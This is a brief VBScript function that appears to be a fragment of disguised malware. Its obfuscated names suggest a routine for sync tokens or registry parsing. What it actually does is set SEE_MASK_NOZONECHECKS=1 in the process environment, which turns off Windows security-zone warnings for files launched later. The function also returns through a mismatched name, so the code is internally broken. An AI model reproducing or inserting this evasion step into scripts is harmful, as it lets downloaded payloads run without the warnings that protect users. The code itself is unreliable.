Function ExtractSyncToken79()
On Error Resume Next
  Dim strSyncBuffer12,strManifestRaw26,blnReady44
  Set strSyncBuffer12=CreateObject("WScript.Shell")
  strManifestRaw26=strSyncBuffer12.ExpandEnvironmentStrings("%TEMP%")
  blnReady44=strSyncBuffer12.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(strManifestRaw26)>0 And Len(blnReady44)>0 Then
    strSyncBuffer12.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    ParseRegistryChunk76=1
    Exit Function
  End If
  ParseRegistryChunk76=0
End Function

